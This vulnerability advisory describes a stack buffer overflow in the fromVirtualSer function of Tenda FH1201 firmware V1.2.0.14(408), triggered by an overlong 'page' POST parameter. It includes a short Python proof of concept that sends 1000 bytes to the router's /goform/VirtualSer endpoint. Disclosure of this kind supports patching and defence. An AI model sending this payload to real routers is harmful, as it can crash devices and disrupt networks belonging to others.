## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3322.html

## Affected version

FH1201 Firmware  V1.2.0.14(408)

## Vulnerability details

The Tenda FH1201 Firmware  V1.2.0.14(408) has a stack overflow vulnerability located in the `fromVirtualSer` function. This function accepts the `page` parameter from a POST request. The statement `sprintf(v5, "nat_virtualser.asp?page=%s", v3);` leads to a buffer overflow. The user-supplied `page` can exceed the capacity of the `v5` array, thus triggering this security vulnerability.

![image-20240731140216299](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731140216299.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/VirtualSer"
payload = b"a"*1000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240731133213595](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731133213595.png)